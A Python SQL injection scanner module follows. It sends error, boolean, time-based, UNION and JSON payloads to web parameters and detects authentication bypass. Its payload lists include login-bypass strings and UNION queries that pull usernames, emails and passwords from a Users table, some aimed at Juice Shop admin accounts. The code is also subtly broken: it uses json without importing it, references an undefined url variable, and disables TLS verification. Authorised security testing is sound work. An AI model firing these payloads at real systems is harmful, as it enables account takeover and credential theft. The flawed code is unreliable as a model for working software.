"""
Advanced SQL Injection Detector
DOM structure analysis, time-based detection with statistical analysis,
boolean-based detection, and error-based detection
"""
import asyncio
import time
import re
import statistics
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
import logging
from urllib.parse import quote, urlparse, parse_qs

try:
    from playwright.async_api import Page
except ImportError:
    pass

import requests

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class SQLiType(Enum):
    """SQL Injection types"""
    ERROR_BASED = "error_based"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    UNION_BASED = "union_based"
    STACKED_QUERIES = "stacked_queries"
    OUT_OF_BAND = "out_of_band"


class DatabaseType(Enum):
    """Database types"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    UNKNOWN = "unknown"


@dataclass
class SQLiFinding:
    """SQL Injection finding"""
    vulnerability_type: SQLiType
    severity: str
    url: str
    parameter: str
    payload: str
    database_type: DatabaseType
    evidence: str
    response_time: float = 0.0
    http_status: int = 0
    dom_changed: bool = False
    extracted_data: Optional[str] = None
    confidence: float = 1.0
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "template-id": f"sqli-{self.vulnerability_type.value}",
            "tool": "advanced-sqli-detector",
            "info": {
                "name": f"SQL Injection ({self.vulnerability_type.value.replace('_', ' ').title()})",
                "description": f"SQL Injection detected via {self.vulnerability_type.value}. Database: {self.database_type.value}. Parameter: {self.parameter}",
                "severity": self.severity,
                "solution": "Use parameterized queries/prepared statements. Validate and sanitize all input. Implement WAF rules.",
                "cwe-id": ["CWE-89"],
                "references": []
            },
            "url": self.url,
            "matched-at": self.url,
            "parameter": self.parameter,
            "evidence": self.evidence[:500],
            "payload": self.payload,
            "response_time_ms": self.response_time,
            "confidence": self.confidence
        }


class SQLiPayloads:
    """SQL Injection payload generator"""

    def __init__(self):
        self.error_payloads = self._get_error_payloads()
        self.boolean_payloads = self._get_boolean_payloads()
        self.time_payloads = self._get_time_payloads()
        self.union_payloads = self._get_union_payloads()
        self.json_payloads = self._get_json_payloads()

    def _get_error_payloads(self) -> List[str]:
        """Payloads that trigger SQL errors"""
        return [
            "'",  # Unclosed quote
            "''",  # Double quote
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR ''='",
            "admin'--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x20,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            "' GROUP BY CONCAT(0x7e,version(),0x7e,COUNT(*))--",
            "1' HAVING 1=1--",
            "') OR ('1'='1",
            "')) OR (('1'='1",
        ]

    def _get_boolean_payloads(self) -> List[Tuple[str, str, bool]]:
        """Boolean-based payloads (payload, description, expected_true)"""
        return [
            ("' AND 1=1--", "AND true condition", True),
            ("' AND 1=2--", "AND false condition", False),
            ("' OR 1=1--", "OR true condition", True),
            ("' OR 1=2--", "OR false condition", False),
            ("' AND 'a'='a'--", "String AND true", True),
            ("' AND 'a'='b'--", "String AND false", False),
            ("1 AND 1=1", "Numeric AND true", True),
            ("1 AND 1=2", "Numeric AND false", False),
        ]

    def _get_time_payloads(self) -> List[Tuple[str, str]]:
        """Time-based payloads (payload, database)"""
        return [
            ("'; WAITFOR DELAY '0:0:5'--", "mssql"),
            ("' AND SLEEP(5)--", "mysql"),
            ("' AND PG_SLEEP(5)--", "postgresql"),
            ("'; SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--", "mysql"),
            ("' AND (SELECT 5 FROM PG_SLEEP(5))--", "postgresql"),
            ("' AND BENCHMARK(10000000,SHA1('test'))--", "mysql"),
            ("'; WAITFOR DELAY '0:0:3'--", "mssql"),
            ("' AND SLEEP(3)--", "mysql"),
        ]

    def _get_union_payloads(self) -> List[str]:
        """UNION-based payloads"""
        payloads = []

        # Generate payloads for 1-15 columns
        for i in range(1, 16):
            nulls = ",".join(["NULL"] * i)
            payloads.append(f"' UNION SELECT {nulls}--")
            payloads.append(f"' UNION SELECT {nulls}#")
            payloads.append(f"-1' UNION SELECT {nulls}--")

        # Data extraction payloads
        payloads.extend([
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns--",
            "' UNION SELECT sql,NULL FROM sqlite_master--",
            "' UNION SELECT username,email,password FROM Users--",
        ])

        return payloads

    def _get_json_payloads(self) -> List[Dict[str, str]]:
        """SQLi payloads for JSON body requests"""
        return [
            # Classic auth bypass
            {"email": "' OR '1'='1", "password": "' OR '1'='1"},
            {"email": "' OR 1=1--", "password": "anything"},
            {"email": "admin'--", "password": "anything"},
            {"email": "' OR ''='", "password": "' OR ''='"},
            
            # Email-based bypass
            {"email": "admin@juice-sh.op'--", "password": "x"},
            {"email": "user@juice-sh.op' OR '1'='1", "password": "x"},
            
            # UNION-based
            {"email": "' UNION SELECT * FROM Users WHERE email='admin@juice-sh.op'--", "password": "x"},
            
            # Comment-based
            {"email": "admin@juice-sh.op#", "password": "x"},
            
            # Advanced bypasses
            {"email": "' OR email LIKE '%admin%'--", "password": "x"},
            {"email": "' OR 1=1 LIMIT 1--", "password": "x"},
            
            # Generic JSON SQLi
            {"username": "' OR '1'='1", "password": "' OR '1'='1"},
            {"user": "' OR 1=1--", "pass": "x"},
            {"login": "' OR ''='", "password": "' OR ''='"},
        ]

    def get_json_payloads_for_field(self, field_name: str) -> List[Dict[str, str]]:
        """Get JSON payloads targeting specific field"""
        filtered = []
        for payload in self.json_payloads:
            if field_name in payload:
                filtered.append(payload)
        return filtered if filtered else self.json_payloads

    def get_payloads_for_param(self, param_name: str, param_value: str) -> Dict[str, List]:
        """Get appropriate payloads based on parameter type"""
        # Numeric parameter
        if param_value.isdigit():
            return {
                'error': ["'", "1' OR '1'='1", "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name))"],
                'boolean': [("1 AND 1=1", True), ("1 AND 1=2", False)],
                'time': self.time_payloads,
                'union': [f"1 UNION SELECT {','.join(['NULL']*i)}--" for i in range(1, 6)]
            }

        # String parameter
        return {
            'error': self.error_payloads,
            'boolean': self.boolean_payloads,
            'time': self.time_payloads,
            'union': self.union_payloads
        }


class AdvancedSQLiDetector:
    """
    Advanced SQL Injection detector with multiple detection techniques
    """

    def __init__(
        self,
        page: Optional['Page'] = None,
        http_session: Optional[requests.Session] = None,
        timeout: int = 30000,
        time_delay: int = 5
    ):
        self.page = page
        self.http_session = http_session or requests.Session()
        self.timeout = timeout
        self.time_delay = time_delay

        self.payload_generator = SQLiPayloads()
        self.findings: List[SQLiFinding] = []

        # SQL error patterns
        self.sql_error_patterns = [
            (r"SQL syntax.*MySQL", DatabaseType.MYSQL),
            (r"MySQL.*syntax", DatabaseType.MYSQL),
            (r"Warning.*mysql_", DatabaseType.MYSQL),
            (r"PostgreSQL.*ERROR", DatabaseType.POSTGRESQL),
            (r"PG::SyntaxError", DatabaseType.POSTGRESQL),
            (r"ORA-\d+", DatabaseType.ORACLE),
            (r"Oracle.*ORA", DatabaseType.ORACLE),
            (r"Microsoft.*SQL Server", DatabaseType.MSSQL),
            (r"SQLServer.*Error", DatabaseType.MSSQL),
            (r"SQLite3::SQLException", DatabaseType.SQLITE),
            (r"SQLITE_ERROR", DatabaseType.SQLITE),
            (r"near.*syntax error", DatabaseType.SQLITE),
            (r"Unclosed quotation mark", DatabaseType.MSSQL),
            (r"Invalid column name", DatabaseType.MSSQL),
            (r"PDOException", DatabaseType.UNKNOWN),
            (r"you have an error in your SQL", DatabaseType.UNKNOWN),
            (r"Database.*Error", DatabaseType.UNKNOWN),
        ]

        self.http_session.verify = False
        self.http_session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })

    async def detect_sqli(
        self,
        url: str,
        parameter: str,
        method: str = "GET",
        original_value: Optional[str] = None
    ) -> List[SQLiFinding]:
        """
        Comprehensive SQLi detection for a parameter
        """
        findings = []

        logger.info(f"Testing SQLi on {url} (parameter: {parameter})")

        # Get baseline response
        baseline = await self._get_baseline(url, parameter, method, original_value)

        # Error-based detection
        error_finding = await self._detect_error_based(url, parameter, method, baseline)
        if error_finding:
            findings.append(error_finding)
            return findings  # Found vulnerability, no need for more tests

        # Boolean-based detection
        boolean_finding = await self._detect_boolean_based(url, parameter, method, baseline)
        if boolean_finding:
            findings.append(boolean_finding)

        # Time-based detection
        time_finding = await self._detect_time_based(url, parameter, method, baseline)
        if time_finding:
            findings.append(time_finding)

        # UNION-based detection
        union_finding = await self._detect_union_based(url, parameter, method, baseline)
        if union_finding:
            findings.append(union_finding)

        self.findings.extend(findings)
        return findings

    async def detect_json_sqli(
        self,
        url: str,
        json_fields: List[str],
        original_body: Dict[str, Any]
    ) -> List[SQLiFinding]:
        """
        SQLi detection for JSON body requests
        Tests injection into JSON fields
        """
        findings = []
        
        logger.info(f"Testing JSON SQLi on {url} (fields: {json_fields})")
        
        for field in json_fields:
            logger.info(f"Testing field: {field}")
            
            for payload_dict in self.payload_generator.get_json_payloads_for_field(field):
                try:
                    # Create modified JSON body
                    test_body = original_body.copy()
                    test_body[field] = payload_dict.get(field, payload_dict.get('email', "' OR 1=1--"))
                    
                    # Send request
                    if self.page:
                        # Use browser to send request
                        response_data = await self._send_json_request_via_browser(
                            url, "POST", test_body
                        )
                    else:
                        # Use HTTP session
                        resp = self.http_session.post(
                            url,
                            json=test_body,
                            timeout=self.timeout // 1000
                        )
                        response_data = {
                            'status': resp.status_code,
                            'body': resp.text,
                            'headers': dict(resp.headers)
                        }
                    
                    # Analyze response
                    finding = self._analyze_json_response(
                        payload=test_body,
                        original_body=original_body,
                        response=response_data,
                        field=field
                    )
                    
                    if finding:
                        findings.append(finding)
                        return findings  # Found vuln, no need to continue
                        
                except Exception as e:
                    logger.debug(f"JSON SQLi test error: {e}")
                    continue
        
        self.findings.extend(findings)
        return findings

    async def _send_json_request_via_browser(
        self,
        url: str,
        method: str,
        json_body: Dict
    ) -> Dict:
        """Send JSON request using browser's fetch API"""
        try:
            result = await self.page.evaluate(f"""
                async () => {{
                    try {{
                        const response = await fetch('{url}', {{
                            method: '{method}',
                            headers: {{
                                'Content-Type': 'application/json',
                            }},
                            body: JSON.stringify({json.dumps(json_body)})
                        }});
                        return {{
                            status: response.status,
                            body: await response.text(),
                            headers: Object.fromEntries(response.headers.entries())
                        }};
                    }} catch (e) {{
                        return {{ error: e.message }};
                    }}
                }}
            """)
            return result
        except Exception as e:
            logger.error(f"Browser JSON request error: {e}")
            return {'error': str(e)}

    def _analyze_json_response(
        self,
        payload: Dict,
        original_body: Dict,
        response: Dict,
        field: str
    ) -> Optional[SQLiFinding]:
        """Analyze JSON response for SQLi indicators"""
        try:
            status = response.get('status', 0)
            body = response.get('body', '')
            
            # Try to parse JSON response
            try:
                data = json.loads(body)
            except:
                data = None
            
            # Check for authentication bypass indicators
            if data:
                # JWT token in response
                if 'authentication' in data and isinstance(data['authentication'], dict):
                    token = data['authentication'].get('token')
                    if token and token.startswith('eyJ'):
                        return SQLiFinding(
                            vulnerability_type=SQLiType.ERROR_BASED,  # Reusing for auth bypass
                            severity="critical",
                            url=url,
                            parameter=field,
                            payload=json.dumps(payload),
                            database_type=DatabaseType.UNKNOWN,
                            evidence=f"Authentication bypass via JSON SQLi! JWT token obtained",
                            http_status=status
                        )
                
                # User data in response
                if 'user' in data and isinstance(data['user'], dict):
                    if data['user'].get('email'):
                        return SQLiFinding(
                            vulnerability_type=SQLiType.ERROR_BASED,
                            severity="critical",
                            url=url,
                            parameter=field,
                            payload=json.dumps(payload),
                            database_type=DatabaseType.UNKNOWN,
                            evidence=f"Auth bypass! Logged in as: {data['user'].get('email')}",
                            http_status=status
                        )
            
            # Check for SQL error messages in response
            for pattern, db_type in self.sql_error_patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    return SQLiFinding(
                        vulnerability_type=SQLiType.ERROR_BASED,
                        severity="critical",
                        url=url,
                        parameter=field,
                        payload=json.dumps(payload),
                        database_type=db_type,
                        evidence=f"SQL error pattern in JSON response: {pattern}",
                        http_status=status
                    )
            
            # Status code analysis (200 on invalid credentials = potential bypass)
            if status == 200 and 'password' in payload and 'email' in payload:
                # Check if response indicates success (not "Invalid credentials")
                if data and ('token' in data or 'authentication' in data or 'user' in data):
                    return SQLiFinding(
                        vulnerability_type=SQLiType.ERROR_BASED,
                        severity="critical",
                        url=url,
                        parameter=field,
                        payload=json.dumps(payload),
                        database_type=DatabaseType.UNKNOWN,
                        evidence=f"Successful login with SQLi payload (status 200 + auth data)",
                        http_status=status
                    )
                    
        except Exception as e:
            logger.debug(f"JSON response analysis error: {e}")
        
        return None

    async def _get_baseline(
        self,
        url: str,
        parameter: str,
        method: str,
        original_value: Optional[str]
    ) -> Dict[str, Any]:
        """Get baseline response for comparison"""
        baseline = {
            'status_code': 0,
            'content_length': 0,
            'content_hash': 0,
            'response_time': 0.0,
            'dom_structure': ''
        }

        try:
            if self.page and method == "GET":
                # Use browser for accurate DOM analysis
                start = time.time()
                test_url = f"{url.split('?')[0]}?{parameter}={quote(original_value or 'test')}"

                await self.page.goto(test_url, wait_until="domcontentloaded", timeout=self.timeout)
                await asyncio.sleep(0.5)

                content = await self.page.content()
                baseline['dom_structure'] = self._extract_dom_structure(content)
                baseline['content_length'] = len(content)
                baseline['response_time'] = time.time() - start

            else:
                # Use HTTP requests
                start = time.time()
                if method == "GET":
                    test_url = f"{url.split('?')[0]}?{parameter}={quote(original_value or 'test')}"
                    resp = self.http_session.get(test_url, timeout=self.timeout // 1000)
                else:
                    resp = self.http_session.post(url.split('?')[0], json={parameter: original_value or 'test'}, timeout=self.timeout // 1000)

                baseline['status_code'] = resp.status_code
                baseline['content_length'] = len(resp.text)
                baseline['response_time'] = time.time() - start

        except Exception as e:
            logger.debug(f"Baseline error: {e}")

        return baseline

    def _extract_dom_structure(self, html: str) -> str:
        """Extract DOM structure signature for comparison"""
        # Extract key structural elements
        patterns = [
            r'<form[^>]*>',
            r'<table[^>]*>',
            r'<div[^>]*class="[^"]*"[^>]*>',
            r'<input[^>]*name="[^"]*"[^>]*>',
        ]

        structure = []
        for pattern in patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            structure.extend(matches[:5])  # Limit matches

        return "|".join(structure)

    async def _detect_error_based(
        self,
        url: str,
        parameter: str,
        method: str,
        baseline: Dict
    ) -> Optional[SQLiFinding]:
        """Detect error-based SQLi"""
        for payload in self.payload_generator.error_payloads[:10]:
            try:
                if method == "GET":
                    test_url = f"{url.split('?')[0]}?{parameter}={quote(payload)}"

                    if self.page:
                        await self.page.goto(test_url, wait_until="domcontentloaded", timeout=self.timeout)
                        content = await self.page.content()
                        status = 200
                    else:
                        resp = self.http_session.get(test_url, timeout=self.timeout // 1000)
                        content = resp.text
                        status = resp.status_code
                else:
                    if self.page:
                        await self.page.goto(url.split('?')[0], wait_until="domcontentloaded", timeout=self.timeout)
                        await self.page.fill(f'input[name="{parameter}"]', payload)
                        await self.page.click('input[type="submit"], button[type="submit"]')
                        await asyncio.sleep(1)
                        content = await self.page.content()
                        status = 200
                    else:
                        resp = self.http_session.post(url.split('?')[0], json={parameter: payload}, timeout=self.timeout // 1000)
                        content = resp.text
                        status = resp.status_code

                # Check for SQL errors
                for pattern, db_type in self.sql_error_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        finding = SQLiFinding(
                            vulnerability_type=SQLiType.ERROR_BASED,
                            severity="critical",
                            url=test_url if method == "GET" else url,
                            parameter=parameter,
                            payload=payload,
                            database_type=db_type,
                            evidence=f"SQL error pattern matched: {pattern}",
                            http_status=status
                        )
                        logger.warning(f"Error-based SQLi found: {parameter} = {payload[:30]}")
                        return finding

            except Exception as e:
                logger.debug(f"Error-based test error: {e}")

        return None

    async def _detect_boolean_based(
        self,
        url: str,
        parameter: str,
        method: str,
        baseline: Dict
    ) -> Optional[SQLiFinding]:
        """Detect boolean-based SQLi with statistical analysis"""
        results = []

        for payload_tuple in self.payload_generator.boolean_payloads:
            try:
                payload = payload_tuple[0]
                expected_true = payload_tuple[2]  # Third element is the expected result
                
                if method == "GET":
                    test_url = f"{url.split('?')[0]}?{parameter}={quote(payload)}"

                    if self.page:
                        start = time.time()
                        await self.page.goto(test_url, wait_until="domcontentloaded", timeout=self.timeout)
                        content = await self.page.content()
                        response_time = time.time() - start
                    else:
                        start = time.time()
                        resp = self.http_session.get(test_url, timeout=self.timeout // 1000)
                        content = resp.text
                        response_time = time.time() - start

                    results.append({
                        'payload': payload,
                        'expected_true': expected_true,
                        'content_length': len(content),
                        'response_time': response_time
                    })

            except Exception as e:
                logger.debug(f"Boolean test error: {e}")

        if len(results) < 4:
            return None

        # Analyze results for boolean-based SQLi
        true_lengths = [r['content_length'] for r in results if r['expected_true']]
        false_lengths = [r['content_length'] for r in results if not r['expected_true']]

        if true_lengths and false_lengths:
            avg_true = statistics.mean(true_lengths)
            avg_false = statistics.mean(false_lengths)

            # Significant difference indicates boolean-based SQLi
            if abs(avg_true - avg_false) > 100:
                # Calculate z-score for confidence
                all_lengths = true_lengths + false_lengths
                if len(all_lengths) > 1:
                    std_dev = statistics.stdev(all_lengths)
                    if std_dev > 0:
                        z_score = abs(avg_true - avg_false) / std_dev
                        confidence = min(1.0, z_score / 3)  # Normalize to 0-1

                        if confidence > 0.5:
                            finding = SQLiFinding(
                                vulnerability_type=SQLiType.BOOLEAN_BASED,
                                severity="critical",
                                url=url,
                                parameter=parameter,
                                payload=self.payload_generator.boolean_payloads[0][0],
                                database_type=DatabaseType.UNKNOWN,
                                evidence=f"Content length difference: TRUE={avg_true:.0f}, FALSE={avg_false:.0f}",
                                confidence=confidence
                            )
                            logger.warning(f"Boolean-based SQLi found: {parameter}")
                            return finding

        return None

    async def _detect_time_based(
        self,
        url: str,
        parameter: str,
        method: str,
        baseline: Dict
    ) -> Optional[SQLiFinding]:
        """Detect time-based SQLi with statistical analysis"""
        delay_times = []

        # Test with time-based payloads
        for payload, db_type in self.payload_generator.time_payloads[:6]:
            try:
                times = []

                # Multiple measurements for statistical significance
                for i in range(3):
                    if method == "GET":
                        test_url = f"{url.split('?')[0]}?{parameter}={quote(payload)}"

                        if self.page:
                            start = time.time()
                            await self.page.goto(test_url, wait_until="domcontentloaded", timeout=self.timeout)
                            elapsed = time.time() - start
                        else:
                            start = time.time()
                            self.http_session.get(test_url, timeout=60)
                            elapsed = time.time() - start

                        times.append(elapsed)

                    else:
                        # POST request
                        start = time.time()
                        self.http_session.post(url.split('?')[0], json={parameter: payload}, timeout=60)
                        elapsed = time.time() - start
                        times.append(elapsed)

                avg_time = statistics.mean(times)
                delay_times.append((avg_time, payload, db_type))

            except Exception as e:
                logger.debug(f"Time-based test error: {e}")

        if not delay_times:
            return None

        # Analyze delays
        significant_delays = [(t, p, d) for t, p, d in delay_times if t >= self.time_delay - 1]

        if significant_delays:
            avg_delay = statistics.mean([t[0] for t in significant_delays])
            finding = SQLiFinding(
                vulnerability_type=SQLiType.TIME_BASED,
                severity="critical",
                url=url,
                parameter=parameter,
                payload=significant_delays[0][1],
                database_type=DatabaseType(significant_delays[0][2]) if significant_delays[0][2] != "unknown" else DatabaseType.UNKNOWN,
                evidence=f"Average response delay: {avg_delay:.2f}s (threshold: {self.time_delay}s)",
                response_time=avg_delay
            )
            logger.warning(f"Time-based SQLi found: {parameter} (delay: {avg_delay:.2f}s)")
            return finding

        return None

    async def _detect_union_based(
        self,
        url: str,
        parameter: str,
        method: str,
        baseline: Dict
    ) -> Optional[SQLiFinding]:
        """Detect UNION-based SQLi"""
        for payload in self.payload_generator.union_payloads[:20]:
            try:
                if method == "GET":
                    test_url = f"{url.split('?')[0]}?{parameter}={quote(payload)}"

                    if self.page:
                        await self.page.goto(test_url, wait_until="domcontentloaded", timeout=self.timeout)
                        content = await self.page.content()
                    else:
                        resp = self.http_session.get(test_url, timeout=self.timeout // 1000)
                        content = resp.text
                else:
                    continue  # UNION typically works with GET

                # Check for UNION indicators
                indicators = [
                    'NULL' in content.upper() and payload.count('NULL') <= content.upper().count('NULL'),
                    re.search(r'<table[^>]*>.*NULL.*</table>', content, re.IGNORECASE),
                    len(content) > baseline.get('content_length', 0) * 1.5,  # Significantly longer response
                ]

                if sum(indicators) >= 2:
                    finding = SQLiFinding(
                        vulnerability_type=SQLiType.UNION_BASED,
                        severity="critical",
                        url=test_url,
                        parameter=parameter,
                        payload=payload,
                        database_type=DatabaseType.UNKNOWN,
                        evidence="UNION-based injection successful - data extraction possible"
                    )
                    logger.warning(f"UNION-based SQLi found: {parameter}")
                    return finding

            except Exception as e:
                logger.debug(f"UNION test error: {e}")

        return None

    def get_findings(self) -> List[SQLiFinding]:
        """Get all findings"""
        return self.findings

    def get_findings_summary(self) -> Dict[str, Any]:
        """Get summary of findings"""
        return {
            'total': len(self.findings),
            'by_type': {t.value: len([f for f in self.findings if f.vulnerability_type == t]) for t in SQLiType},
            'by_severity': {s: len([f for f in self.findings if f.severity == s]) for s in ['critical', 'high', 'medium', 'low', 'info']}
        }


if __name__ == "__main__":
    print("Advanced SQLi Detector module loaded")
